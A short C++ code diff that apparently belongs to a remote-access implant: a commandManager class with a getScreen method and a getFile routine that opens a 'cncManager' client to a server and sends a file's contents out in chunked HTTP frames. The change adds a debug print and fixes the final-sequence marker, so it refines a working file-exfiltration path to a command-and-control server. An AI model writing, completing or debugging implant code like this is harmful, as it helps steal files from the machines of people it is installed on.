@@ -90,6 +90,7 @@ LPVOID commandManager::getScreen() {
 }
 
 void commandManager::getFile(std::string& path, LPCWSTR server) {
+    std::cout << path << std::endl;
     cncManager client(server);
     FILE* fp = NULL;
     UCHAR* buffer = new UCHAR[sizeof(DDprotocol)+DATA_BUF_SIZE]; //450MB
@@ -126,7 +127,7 @@ void commandManager::getFile(std::string& path, LPCWSTR server) {
             else if (sequence != 0 && size < DATA_BUF_SIZE) {
                 sequence++;
                 dataFrame->len = size;
-                dataFrame->seq = 0;
+                dataFrame->seq = LAST_SEQUENCE;
                 std::cout << dataFrame->seq << std::endl;
                 memcpy(buffer, dataFrame, sizeof(DDprotocol));
                 client.sendHttpRequest((LPVOID)buffer, sizeof(DDprotocol) + size);
